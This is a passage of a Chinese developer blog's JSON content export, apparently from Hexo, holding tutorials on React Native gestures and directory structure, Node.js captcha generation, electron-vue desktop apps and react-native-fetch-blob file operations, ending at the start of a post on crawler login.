是由两个触发源共同构建的，所以只有当前界面 touches 为 2 时才会返回 true，也才会触发 onPanResponderGrant 方法。 接着在 onPanResponderGrant 方法里，我们改变背景色，提供用户友好的 touch 反馈，并且计算当前两个触发点的距离和缓存之前的放缩量。 接下去，当我们移动时，触发 onPanResponderMove 方法，我们可以通过 event.nativeEvent.touches 获取两个触发源及其位置。然后计算当前两个触发点的距离，并且与一开始的距离相减得到改变量，缓存的放缩量加上改变量就是最新的放缩量。 这里注意，当我们在 onStartShouldSetPanResponder 里返回 true 后 onPanResponderGrant 方法调用，且 onPanResponderRelease 没调用时，我们增加触发源并不会调用 onStartShouldSetPanResponder。相反，只要 onStartShouldSetPanResponder 没返回 true，每增加一个触发源都会调用 onStartShouldSetPanResponder。 通过 transform - scale 来对图像进行放缩。 参考资料 http://reactnative.cn/docs/next/gesture-responder-system.html","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"Nodejs 验证码解决方案","slug":"Nodejs/Nodejs 验证码解决方案","date":"2017-08-15T01:21:54.000Z","updated":"2021-06-15T06:10:52.841Z","comments":true,"path":"/stories/2017/08/Nodejs/Nodejs 验证码解决方案/","link":"","permalink":"http://me.lizhooh.com/stories/2017/08/Nodejs/Nodejs 验证码解决方案/","excerpt":"前言使用 Nodejs 开发验证码部分是非常麻烦的，这是因为 Nodejs 没有图形相关的 API，这就要使用 C++ 来编写扩展，给 Nodejs 来调用。下面提出了几个可行的验证码解决方案。 参考：https://www.zhihu.com/question/32156977","text":"前言使用 Nodejs 开发验证码部分是非常麻烦的，这是因为 Nodejs 没有图形相关的 API，这就要使用 C++ 来编写扩展，给 Nodejs 来调用。下面提出了几个可行的验证码解决方案。 参考：https://www.zhihu.com/question/32156977 node-canvasnode-canvas 是一个支持 canvas api 的 2D 图像库，它使用 C++ 编写的。安装它非常麻烦，需要： node-gyp GTK 2 libjpeg-turbo node-canvas 具体参考文档：https://github.com/Automattic/node-canvas/wiki 基本使用可以通过 canvas 来绘制验证码，最简单的是在图片容器里绘制字母与数字，再加几条随机的线条。 1234567891011121314151617181920212223const &#123; createCanvas, loadImage &#125; = require('canvas');const canvas = createCanvas(200, 200);const ctx = canvas.getContext('2d');// Write \"Awesome!\"ctx.font = '30px Impact'; // 字体ctx.rotate(0.1); // 旋转ctx.fillText('Awesome!', 50, 100); // 内容// Draw line under textvar text = ctx.measureText('Awesome!');ctx.strokeStyle = 'rgba(0, 0, 0, 0.5)';ctx.beginPath();ctx.lineTo(50, 102);ctx.lineTo(50 + text.width, 102);ctx.stroke();// lime-cat 是一个图片容器，读取图片容器后，把内容画上去。loadImage('examples/images/lime-cat.jpg').then((image) =&gt; &#123; ctx.drawImage(image, 50, 0, 70, 70) console.log('&lt;img src=\"' + canvas.toDataURL() + '\" /&gt;')&#125;); svg-captchasvg-captcha 使用 Nodejs 生成 svg 验证码。 对于node-canvas来说，svg-captcha有以下优势： 不需要安装 google recaptcha 不需要安装 c++ 模块 svg 验证码可能比的图片普通验证码要更难识别 svg-captcha 不好的地方是： 需要浏览器支持 svg 封装密集高，无法定制 基本使用下面在 Koa2 上进行测试 svg-captcha。 安装： 1npm install --save svg-captcha 使用： 123456789101112131415161718192021222324const Koa = require('koa');const Router = require('koa-router');const svgCaptcha = require('svg-captcha');const app = new Koa();const router = new Router();router .get('/', async ctx =&gt; &#123; const captcha = svgCaptcha.create(&#123; noise: 5, color: true &#125;); console.log(captcha.text); ctx.header['Content-Type'] = 'image/svg+xml'; ctx.body = captcha.data; &#125;) ;app .use(require('koa-logger')()) .use(router.routes())app.listen(3000, () =&gt; &#123; console.log('\\n\\tserver run in 3000');&#125;); 可以说，使用 svg-captcha 是一种简单粗暴的方式。 更多参考：https://github.com/lemonce/svg-captcha/blob/master/README_CN.md 第三方也可以使用第三方的验证码系统，比如：极验具体部署参考：http://docs.geetest.com/install/server/node/ 拋锅对于 Nodejs 来说，其实生成验证码是一个密集的计算，所以很多时候应该把这部分交给其他语言去处理，比如： Golang，Python，PHP。","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"使用 Electron-vue 构建桌面应用","slug":"Electron/使用 Electron-vue 构建桌面应用","date":"2017-08-10T02:37:10.000Z","updated":"2021-06-15T06:10:52.814Z","comments":true,"path":"/stories/2017/08/Electron/使用 Electron-vue 构建桌面应用/","link":"","permalink":"http://me.lizhooh.com/stories/2017/08/Electron/使用 Electron-vue 构建桌面应用/","excerpt":"前言对于 Electron 开发来说，它并没有提供类似 vue-cli 的搭手架工具，然而早在之前就有人开发了Electron-vue。Electron-vue该项目的目的是消除使用 vue 手动设置 Electron 应用程序的需要。Electron-vue 利用了 vue-cli 脚手架，webpack 与 vue-loader，electron-packager 或 electron-builder，包括最常用的插件 vue-router，vuex。 本文记录了 electron-vue 与 electron-packager 的使用，一个是构建工具，一个是打包发布工具。","text":"前言对于 Electron 开发来说，它并没有提供类似 vue-cli 的搭手架工具，然而早在之前就有人开发了Electron-vue。Electron-vue该项目的目的是消除使用 vue 手动设置 Electron 应用程序的需要。Electron-vue 利用了 vue-cli 脚手架，webpack 与 vue-loader，electron-packager 或 electron-builder，包括最常用的插件 vue-router，vuex。 本文记录了 electron-vue 与 electron-packager 的使用，一个是构建工具，一个是打包发布工具。 electron-vue要安装 electron-vue 非常简单，因为它并不是一个独立的命令行工具，只是一个模版，所以只需要使用 vue-cli 安装就可以了。 安装： 1vue init simulatedgreg/electron-vue my-project 之后再安装 node_module，但是发现使用 npm install 会出错（被墙了），所以要使用 cnpm 来安装。 1cnpm install 安装完成后，直接跑起： 1npm run dev 如果成功了，会看到这个画面（完结撒花）： npm scripts为了帮助消除开发过程中的冗余任务，electron-vue 已经帮你配置好一些有用的 npm scripts。 123456npm run dev # 在开发中运行应用程序npm run build # 构建您的应用程序进行生产和打包npm run lint # 检查所有 src/ 的和 test/ 的 JS 和 Vue 的组件文件npm run unit # 单元测试npm run e2e # 使用 Spectron + Mocha 进行端到端测试npm test # 同时运行 npm run unit 和 npm run e2e Vue 全家桶electron-vue 帮你配置好 vue 全家桶，包括了 vue, vuex, vue-router, axios, es6, 7 等。 但是没有配置 less/sass，如果需要的话，可以参考下面的配置： 使用 less 使用 less 只需要安装 less-loader 1npm install --save-dev less-loader 使用 sass 使用 sass 需要安装 sass-loader, node-sass 1cnpm install --save-dev sass-loader node-sass # node-sass 被墙了，使用 cnpm 在 vue style 指明使用 sass： 12345&lt;style lang=\"scss\"&gt; body &#123; /* SCSS */ &#125;&lt;/style&gt; 使用 Sass 全局变量 编辑 .electron-vue/webpack.renderer.config.js 中的 vue-loader 配置 （58 行处） 1234loaders: &#123; sass: 'vue-style-loader!css-loader!sass-loader?indentedSyntax=1&amp;data=@import \"./src/renderer/globals/index.scss\"', scss: 'vue-style-loader!css-loader!sass-loader?data=@import \"./src/renderer/globals/index.scss\";'&#125; 在 src/renderer/globals/index.scss 添加全局变量： 12$brand-primary: blue;$brand-accent: turquoise; 之后就可以在所有的组件里引用全局变量： 123&lt;style lang=\"scss\"&gt; body &#123; color: $brand-primary; &#125;&lt;/style&gt; 使用 CSS 框架假设您想为您的应用程序使用 bootstrap-vue，首先你需要安装它，之后在 src/renderer/main.js 里引入。 1npm install --save bootstrap@4 bootstrap-vue 123456// src/renderer/main.jsimport BootstrapVue from 'bootstrap-vue';import 'bootstrap/dist/css/bootstrap.css';import 'bootstrap-vue/dist/bootstrap-vue.css';Vue.use(BootstrapVue); 使用静态资源应当把所有的静态资源放置在 static 目录下，但你想要引用静态资源时，可以直接使用static/来引入。 123data () &#123; return &#123; imageUrl: 'static/imgs/unsplash.png' &#125;&#125; 同时也可以把静态资源放置在renderer/assets里，使用的时候： 123data () &#123; return &#123; imageUrl: '~@/assets/unsplash.png' &#125;&#125; 读取 static 资源文件假设我存储了一些 JSON 文件，我需要去 static 读取，这样的话可能是使用相对路径来，寻找文件，但并不好。electron-vue 提供了一个名为的全局变量 __static，它是 static/ 目录的路径。 12345import fs from 'fs'import path from 'path'// 读取 static/someFile 文件fs.readFileSync(path.join(__static, '/someFile.txt'), 'utf8') 注意：在生产中，所有文件都 asar 默认打包，因为它是强烈推荐的。因为这样，static/ 文件夹中的资源只能被访问，不能进行写入操作。 文件读写使用 electron 的一个很大的好处是能够访问用户的文件系统。这使您可以读取和写入本地系统上的文件。为了避免 Chromium 限制并写入应用程序的内部文件，请确保使用 electronAPI，特别是 app.getPath(name) 功能。这个帮助方法可以获得文件路径到系统目录，如用户的桌面，系统临时文件等。 如果想要进行数据的本地储存，除了可以使用 HTML5 的 Local Storage 外，还可以使用一些 JSON 数据库，例如：nedb 下面，让一个 nedb 储存在 userData 目录，也就是C:\\Users\\Administrator\\AppData\\Roaming\\Electron目录下。 12345678import Datastore from 'nedb'import path from 'path'import &#123; remote &#125; from 'electron'export default new Datastore(&#123; autoload: true, filename: path.join(remote.app.getPath('userData'), '/data.db')&#125;) 为了方便使用，把它添加到 vue 里： 12import db from './datastore';Vue.prototype.$db = db; 使用 Nodejs 第三方模块在 electron 里，集成了 chrome 与 nodejs，你可以使用 Web API 和 Nodejs API。如果想要使用 Nodejs 第三方模块，安装模块后直接使用即可。 下面是使用 node-fetch 来下载图片。 安装： 1npm install --save node-fetch 使用： 12345678910import fetch from 'node-fetch';import fs from 'fs';fetch('http://pic1.win4000.com/wallpaper/4/570dba07bcc5e.jpg') .then(res =&gt; res.buffer()) .then(data =&gt; &#123; fs.writeFile('./a.jpg', data, 'binary', (err) =&gt; &#123; console.log(err ? err : 'ok'); &#125;); &#125;); 除此之外，你还可以使用 cheerio，mongoose，express，koa 等框架。 打包应用在使用 vue-cli 创建项目时，会出现选择electron-packager还是electron-builder： electron-packager: 如果您是新手制作 electron 应用程序，或者只需要创建简单的可执行文件，那么 electron-packager 就可以满足您的需求。 electron-builder: 如果您正在寻找完整的安装程序，自动更新支持，使用 Travis CI 和 AppVeyor 的 CI 构建，或重建本机节点模块的自动化，那么 electron-builder 您将需要什么。 关于 electron-packager 的打包命令： 1electron-packager &lt;sourcedir&gt; &lt;appname&gt; --platform=&lt;platform&gt; --arch=&lt;arch&gt; [optional flags...] 类似的： 1electron-packager ./ --all --out ~/Desktop/app --platform=win32 --version 1.4.0 --overwrite --icon=./img/test.ico 在 electron-vue 打包应用非常简单，基本别人帮你做好了准备。 根据对应平台，运行一下命令即可，例如打包 win32 平台：npm run build:win32 1234567\"build\": \"node .electron-vue/build.js\",\"build:darwin\": \"cross-env BUILD_TARGET=darwin node .electron-vue/build.js\",\"build:linux\": \"cross-env BUILD_TARGET=linux node .electron-vue/build.js\",\"build:mas\": \"cross-env BUILD_TARGET=mas node .electron-vue/build.js\",\"build:win32\": \"cross-env BUILD_TARGET=win32 node .electron-vue/build.js\",\"build:clean\": \"cross-env BUILD_TARGET=clean node .electron-vue/build.js\",\"build:web\": \"cross-env BUILD_TARGET=web node .electron-vue/build.js\", 注意：打包很吃 CPU 和内存。 打包完成后可以在 build 下找到对应平台的应用程序，比如 windows 的 exe 文件。 最后应用运行起来是这样的： 配置可以在 .electron-vue/build.config.js 根据这里 electron-packager 找到的选项进一步定制。 1234567891011121314151617181920212223242526&#123; // cpu 架构 x64, x86 等 arch: 'x64', // 使用 asar 压缩 asar: true, // 应用程序目录，不用修改 dir: path.join(__dirname, '../'), // 应用图标 // https://github.com/electron-userland/electron-packager/blob/master/docs/api.md#icon icon: path.join(__dirname, '../build/icons/icon'), // 打包忽略的文件 ignore: /(^\\/(src|test|\\.[a-z]+|README|yarn|static|dist\\/web))|\\.gitkeep/, // 编译输出的文件位置 out: path.join(__dirname, '../build'), // 覆盖现有的版本 overwrite: true, // 设置平台的环境变量 platform: process.env.BUILD_TARGET || 'all'&#125; 移民指南（版本迁移）参考以下的建议，来迁移你的版本，但不一定会成功： 创建最新的版本 vue init simulatedgreg/electron-vue my-project 将当前项目 src 文件复制到新项目的 src 目录中 将 package.json 当前项目的依赖关系复制到新的项目 package.json 使用 yarn 或 npm 安装依赖关系 npm install （国内请使用 cnpm install） 在开发模式下运行项目（yarn run dev 或 npm run dev） 观察控制台以修复错误 参考资料 https://github.com/SimulatedGREG/electron-vue https://github.com/electron-userland/electron-packager","categories":[{"name":"Electron","slug":"Electron","permalink":"http://me.lizhooh.com/categories/Electron/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Electron","slug":"Electron","permalink":"http://me.lizhooh.com/tags/Electron/"}]},{"title":"React Native 目录结构最佳实践","slug":"React Native/React Native 目录结构最佳实践","date":"2017-08-08T12:53:21.000Z","updated":"2021-06-15T06:10:52.865Z","comments":true,"path":"/stories/2017/08/React Native/React Native 目录结构最佳实践/","link":"","permalink":"http://me.lizhooh.com/stories/2017/08/React Native/React Native 目录结构最佳实践/","excerpt":"前言经过无数次研究与挖掘，终于探索出比较好的 React Native 开发目录结构。一个好的目录结构，是一个好的开始，它可以把代码进一步的分离，提供维护性。 在这之间，看过：https://www.zhihu.com/question/50750032/answer/136384653 个人感觉还是比较乱。下面是我总结出来的 React Native 开发代码目录结构。 此外，React Native 已经可以指定项目版本了： 1react-native init myApp --version 0.45","text":"前言经过无数次研究与挖掘，终于探索出比较好的 React Native 开发目录结构。一个好的目录结构，是一个好的开始，它可以把代码进一步的分离，提供维护性。 在这之间，看过：https://www.zhihu.com/question/50750032/answer/136384653 个人感觉还是比较乱。下面是我总结出来的 React Native 开发代码目录结构。 此外，React Native 已经可以指定项目版本了： 1react-native init myApp --version 0.45 开始假设现在有页面：home, user, about，组件topbar, loading, make 等。 下面就是一个推荐的目录结构： 说明12345678910111213141516171819202122232425262728App├── api // 网络请求，后端接口│ ├── http // 对 get, post 进行封装│ └── index.js // 导出所有 api├── common // 公共模块├── components // 组件│ ├── index.js // 用来导出部分组件│ ├── topbar.js // 顶端栏组件│ ├── loading.js // 加载器组件│ └── make.js // 标签组件├── config // 用来放置应用的配置项，比如主题颜色├── functions // 自定义的一些功能函数，算法├── lib // 第三方库├── redux // 数据状态管理框架 - redux 相关│ ├── actions // 所有 view 的 action 集中管理│ ├── reducers // 所有 view 的 reducer 集中管理│ ├── types.js // 所有的 action type 集中管理│ └── store.js // create store├── resource // 资源文件目录├── storage // 本地数据储存相关├── test // 测试代码├── views // 所有视图代码│ ├── home.js // 主页│ ├── user.js // 用户页│ └── about.js // 关于页├── index.js // 应用入口├── main.js // 主要文件└── navigator.js // 导航文件 api在 api 文件里通常是放置与后端交互的函数，在 http 文件里对 get, post 进行封装。 比如说，封装一个 post 请求： 123456789101112131415161718192021// http/index.jsimport qs from 'qs';export const post = (url, data, query = null) =&gt; &#123; query &amp;&amp; (url += `?$&#123;qs.stringify(query)&#125;`); return fetch(url, &#123; method: 'post', headers: &#123; 'Content-Type': 'application/json;charset=utf-8', &#125;, body: JSON.stringify(data) &#125;).then(res =&gt; res.json()).then(res =&gt; &#123; if (res.error &amp;&amp; res.error.length &gt; 0) &#123; console.error(`get: $&#123;url&#125;, Error: $&#123;res.error&#125;.`); return Promise.reject(res.error); &#125; return res; &#125;).catch(err =&gt; &#123; console.error(`post: $&#123;url&#125; error. `, err); &#125;);&#125;; components在 components 里应该放置一些组件，比如 tapbar 等。index 文件应该作为总汇导出作用。 1234// components/index.jsexport &#123; default as Make &#125; from './make';export &#123; default as Topbar &#125; from './topbar';export &#123; default as LoadMing &#125; from './loading'; config在 config 文件里应该放置应用的配置文件，比如应用的主题颜色等。 类似的代码有： 12345678910111213141516171819// config/index.jsimport blob from 'react-native-fetch-blob';// 主题颜色const _color = 'rgba(30, 155, 255, 0.95)';// 应用名称const _appname = 'wx store';// 二维码存储文件目录const _qrcodedir = blob.fs.dirs.DCIMDir + '/wxStore';export default &#123; color: _color, appname: _appname, qrcodedir: _qrcodedir,&#125;;export const color = _color;export const appname = _appname;export const qrcodedir = _qrcodedir; lib在 lib 里放置一些库文件。 redux在 redux 里放置 redux 的文件，action，reducer 的文件名称应该与视图（views 里）名称一一对应。 types.js 里放置所有的 action type 定义，类似的代码有： 12345678910111213141516171819// typse.js/** 扩展状态类型 */const extendState = (obj) =&gt; &#123; Object.keys(obj).forEach(key =&gt; &#123; obj[key + '_in'] = obj[key] + '_in'; // 进行中 obj[key + '_fail'] = obj[key] + '_fail'; // 失败了 obj[key + '_success'] = obj[key] + '_success'; // 成功了 obj[key + '_complete'] = obj[key] + '_complete'; // 完成了 &#125;); return obj;&#125;/** 用户列表 */export const USER = extendState(&#123; // 扩展 type init: 'USER_init', // 初次加载 refresh: 'USER_refresh', // 刷新 loadmore: 'USER_loadmore', // 加载更多 follow: 'USER_follow', // 关注列表&#125;) actions 文件夹里放置的所有 action 文件，而 index.js 文件负责汇总导出，类似的代码有： 123456// actions/index.jsimport * as _home from './home';import * as _user from './user';export const homeActions = _home;export const userActions = _user; reducers 文件夹里放置所有 reducers 文件，而 index.js 文件负责汇总导出，类似的代码有： 12345678910111213// reducers/index.js// 全局初始状态数据export const ROOT_INIT_STATE = &#123;&#125;;export default (state = ROOT_INIT_STATE, action) =&gt; &#123; switch (action.type) &#123; default: return state; &#125;&#125;// state 树分支export &#123; default as home &#125; from './home';export &#123; default as user &#125; from './user'; store.js 里进行 store 的创建，类似的代码有： 123456789101112131415161718// redux/stroe.jsimport &#123; createStore, combineReducers, compose, applyMiddleware,&#125; from 'redux';import thunk from 'redux-thunk';import * as reducers from './reducers';export default store = createStore( combineReducers(&#123; ...reducers &#125;), compose( applyMiddleware(thunk), )); resource在 resource 里主要是放置一些图片资源，JSON 资源等文件。 storage在 storage 里放置本地存储相关的函数，类似的代码有： 1234567891011121314// storage/index.jsimport &#123; AsyncStorage &#125; from 'react-native';export const stroe = &#123; async get(key) &#123; return JSON.parse(await AsyncStorage.getItem(key)); &#125;, async set(key, value) &#123; return await AsyncStorage.setItem(key, JSON.stringify(value)); &#125;, async remove(key) &#123; return await AsyncStorage.removeItem(key); &#125;,&#125;; test在 test 目录里放置一些测试代码。 views在 views 放置页面的代码。 应用入口应用入口类似下面的代码： 1234567891011121314151617181920212223// index.jsimport React, &#123; Component &#125; from 'react';import &#123; StyleSheet &#125; from 'react-native';import &#123; Provider &#125; from 'react-redux';import store from './redux/store';import Navigator from './navigator';import './functions';// 入口点export default class App extends Component &#123; constructor(props) &#123; super(props); &#125; render() &#123; return ( &lt;Provider store=&#123;store&#125;&gt; &lt;Navigator /&gt; &lt;/Provider&gt; ); &#125;&#125; navigator在 navigator 里维持着一个导航器。 看过别人的代码，在使用 navigator.push 时，会把 view 传递过去。 12import Home from './home';navigator.push(&#123; component: Home, data: null &#125;); 但是发现，这样并不明智，其中就需要在 A 页面上 import B 页面，导致页面的引入不集中。 在 navigator.push 时，应该不传递组件而是传递组件名称或者唯一的 id，类似的代码有： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// navigator.jsimport React, &#123; Component &#125; from 'react';import &#123; StyleSheet, View &#125; from 'react-native';import &#123; Navigator &#125; from 'react-native-deprecated-custom-components';import Main from './main';import About from './views/about';import User from './views/user';// 导航类export default class MyNavigatior extends Component &#123; // 页面表 views = &#123; 'Main': Main, 'User': User, 'About': About, &#125;; // 导航动画 configureScene = (route, navigator) =&gt; &#123; switch (route.animated) &#123; case 'top': return Navigator.SceneConfigs.FloatFromBottomAndroid; case 'bottom': return Navigator.SceneConfigs.VerticalDownSwipeJump; case 'left': return Navigator.SceneConfigs.PushFromLeft; case 'right': return Navigator.SceneConfigs.FloatFromRight; default: return Navigator.SceneConfigs.PushFromRight; &#125; &#125;; // 大导航 renderScene = (route, navigator) =&gt; &#123; this.navigator = navigator; const Views = this.views[route.name]; return &lt;Views data=&#123;route.data&#125; navigator=&#123;navigator&#125; /&gt; &#125;; render() &#123; return ( &lt;View style=&#123;$.container&#125;&gt; &lt;Navigator // 初始化是 main.js initialRoute=&#123;&#123; name: 'Main', data: null &#125;&#125; renderScene=&#123;this.renderScene&#125; configureScene=&#123;this.configureScene&#125; /&gt; &lt;/View&gt; ); &#125;&#125; 这样做的好处是，所有的页面引入，可以集中管理。 总结目录结构的组织形式并不需要最好的，而是需要最适合自己的，更多的还是要根据业务逻辑进行抽象分离。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native 文件操作 - fetch-blob","slug":"React Native/IO/React Native 文件操作 - fetch-blob","date":"2017-08-02T07:20:07.000Z","updated":"2021-06-15T06:10:52.854Z","comments":true,"path":"/stories/2017/08/React Native/IO/React Native 文件操作 - fetch-blob/","link":"","permalink":"http://me.lizhooh.com/stories/2017/08/React Native/IO/React Native 文件操作 - fetch-blob/","excerpt":"文件操作之前使用react-native-fs来进行文件操作，发现它还是有点局限性，比如不支持文件流，API 支持有限等。而 react-native-fetch-blob：是一个致力于为 React Native 开发人员提供文件访问和数据传输的项目更容易，更高效的 fs 库。在这里我将尝试使用react-native-fetch-blob来进行文件的操作。 支持的特性： 将数据直接从/转储到没有 base64 桥接的存储 File API 支持常规文件，资源文件和 CameraRoll 文件 本地到本地文件操作 API，减少 JS 桥接性能损失 文件流支持处理大文件 Blob，File，XMLHttpRequest 的 polyfills，使基于浏览器的库可用于 RN（实验） 支持基于 Oboe.js @jimhigson 的 JSON 流","text":"文件操作之前使用react-native-fs来进行文件操作，发现它还是有点局限性，比如不支持文件流，API 支持有限等。而 react-native-fetch-blob：是一个致力于为 React Native 开发人员提供文件访问和数据传输的项目更容易，更高效的 fs 库。在这里我将尝试使用react-native-fetch-blob来进行文件的操作。 支持的特性： 将数据直接从/转储到没有 base64 桥接的存储 File API 支持常规文件，资源文件和 CameraRoll 文件 本地到本地文件操作 API，减少 JS 桥接性能损失 文件流支持处理大文件 Blob，File，XMLHttpRequest 的 polyfills，使基于浏览器的库可用于 RN（实验） 支持基于 Oboe.js @jimhigson 的 JSON 流 react-native-fetch-blob安装： 12npm install --save react-native-fetch-blobreact-native link react-native-fetch-blob 在 Android 上添加外部 SD 访问限权： 123456789&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.rnfetchblobtest\" android:versionCode=\"1\" android:versionName=\"1.0\"&gt; &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt; &lt;uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\"/&gt;+ &lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /&gt;+ &lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" /&gt; 以及 Android Download Manager （下载管理） 的 action （可选，不使用下载器就不用加）： 12345&lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\" /&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;+ &lt;action android:name=\"android.intent.action.DOWNLOAD_COMPLETE\"/&gt;&lt;/intent-filter&gt; 基本使用在react-native-fetch-blob里有两种 API：网络编程与文件操作，其 API 全部返回 Promise 对象。 下面是一个文件请求，并下载到临时缓存目录里： 1234567891011121314import blob from 'react-native-fetch-blob';blob .config(&#123; fileCache: true, // 缓存到磁盘里，而不是内存中 appendExt: 'jpg', // 设置临时文件扩展名 &#125;) .fetch('GET', 'http://pic.7kk.com/upload/4/86/c252be7f05656db819fcc862a382e.jpg', &#123; //some headers .. &#125;) .then((res) =&gt; &#123; // /data/data/com.test/files/RNFetchBlobTmp_bljdsadjadjk12312jk.jpg console.log(res.path()); &#125;); 常用目录这些常量是包含常用文件夹的哈希映射： DocumentDir （数据文件目录） CacheDir （缓存文件目录） MainBundleDir （可用于访问仅嵌入 iOS 应用程序的文件） DCIMDir （相册目录，仅限 Android） DownloadDir （下载目录，仅限 Android） MusicDir （音乐目录，仅限 Android） PictureDir （图片目录，仅限 Android） MovieDir （视频目录，仅限 Android） RingtoneDir （铃音目录，仅限 Android） SDCard （SD 卡目录，仅限 Android） 下载文件到特定路径如果你喜欢一个特定的文件路径而不是随机生成的文件路径，可以使用 path 选项。 12345blob .config(&#123; path : dirs.DocumentDir + '/meinv.jpg', &#125;) .fetch('GET', 'http://pic.7kk.com/upload/4/86/c252be7f05656db819fcc862a382e.jpg'); 上传/下载进度在 version &gt;= 0.4.2 有可能知道上传/下载进度。之后 0.7.0IOS 和 Android 上传进度也支持： 123456789101112131415161718blob.fetch('POST', 'http://www.example.com/upload', &#123; //... some headers, 'Content-Type' : 'octet-stream' &#125;, base64DataString) // 把图片转为 base64 格式，再上传 // listen to upload progress event .uploadProgress((written, total) =&gt; &#123; console.log('uploaded', written / total) &#125;) // listen to download progress event .progress((received, total) =&gt; &#123; console.log('progress', received / total) &#125;) .then((resp) =&gt; &#123; // ... &#125;) .catch((err) =&gt; &#123; // ... &#125;) 文件操作文件操作支持大部分 API，并支持文件流，API 类似 Nodejs fs。下面列出了部分，更多的看 WIKI API 说明 createFile(path, data, encoding) :Promise 创建文件 writeFile(path:string, content:string &amp; Array, encoding:string) :Promise writeStream(path:string, encoding:string) :Promise appendFile(path:string, content:string &amp; Array, encoding:string) :Promise 追加文件内容 readFile(path, encoding) :Promise readStream(path, encoding, bufferSize, interval) :Promise&lt;RNFBReadStream&gt; interval :number(optional, default is 10, -1 to disable) 它限制了事件调度频率 mkdir(path:string) :Promise 支持递归创建 ls(path:string) :Promise mv(from:string, to:string) :Promise cp(src:string, dest:string) :Promise exists(path:string) :Promise isDir(path:string) :Promise unlink(path:string) :Promise lstat(path:string) :Promise&lt;RNFetchBlobStat&gt; stat(path:string) :Promise&lt;RNFetchBlobStat&gt; scanFile(path:string) :Promise (Android Only) asset(filename:string) :string df() :Promise&lt;{ free: number, total: number }&gt; 分区上可使用的磁盘空间 使用方式： 1234import blob from 'react-native-fetch-blob';// 在 DCIM 目录下创建一个 test 文件夹blob.fs.mkdir(blob.fs.dirs.DCIMDir + '/test'); 保存图片示例如果希望有这样一个功能，在用户点击按钮时，把图片保存在本地的磁盘里。要实现，保存图片功能，使用 fetch 轻松搞定。 1234567const path = blob.fs.dirs.DCIMDir + '/test/meinv.jpg';blob.config(&#123; fileCache: true, path &#125;) .fetch('GET', 'http://pic.7kk.com/upload/c/22/e4d4b27deb13380f6b05f9bba0432.jpg') .then((res) =&gt; &#123; console.log(JSON.stringify(res, null, 3)); &#125;) 结果： 真实的应用下面的代码是我的某个 React Native 应用里抽离出来的。 它经历了几件事情： 确定图片存放的位置 查找图片的后缀，根据后缀进行文件的命名 根据 url 下载与保存图片到本地磁盘里 12345678910111213141516171819202122232425262728293031323334// 保存图片到本地save = async event =&gt; &#123; let path = config.qrcodedir; const &#123; image: url, id &#125; = this.props.data.qrcode; const &#123; name &#125; = this.props.data; const types = ['png', 'jpg', 'jpeg', 'gif']; // 检查文件夹存在性 if (!(await blob.fs.isDir(path))) &#123; await blob.fs.mkdir(path); &#125; // 查找后缀 for (let t of types) &#123; let rex = new RegExp(`\\.$&#123;t&#125;$`, 'gi'); if (rex.test(url)) &#123; path += `/$&#123;name&#125;_$&#123;id&#125;.$&#123;t&#125;`; break; &#125; // 匹配不到后缀 if (t === types[types.length - 1]) &#123; return Toast.show(`保存失败，未知错误`, Toast.LONG); &#125; &#125; // 保存 const res = await blob.config(&#123; fileCache: true, path &#125;).fetch('GET', url); if (res.path() &amp;&amp; res.path().length &gt; 0) &#123; Toast.show(`保存成功：$&#123;res.path()&#125;`, Toast.LONG); &#125; else &#123; Toast.show(`保存失败，未知错误`, Toast.LONG); &#125;&#125; 结果： 参考资料 https://github.com/wkh237/react-native-fetch-blob","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"},{"name":"网络请求","slug":"网络请求","permalink":"http://me.lizhooh.com/tags/网络请求/"}]},{"title":"爬虫：Nodejs 实现模拟登录的一次艰辛路程记录","slug":"抓包&爬虫/爬虫：Nodejs 实现模拟登录的一次艰辛路程","date":"2017-08-01T05:14:36.000Z","updated":"2021-06-15T06:10:52.918Z","comments":true,"path":"/stories/2017/08/抓包&爬虫/爬虫：Nodejs 实现模拟登录的一次艰辛路程/","link":"","permalink":"http://me.lizhooh.com/stories/2017/08/抓包&爬虫/爬虫：Nodejs 实现模拟登录的一次艰辛路程/","excerpt":"前言 给自己定下写文章的目标后，就去找了几家博客平台来发布文章；作为一个懒人，不能所有博客文章都手动去各家平台发布，只好通过编写脚本来发布。但是除了Github提供了比较详细的 Api 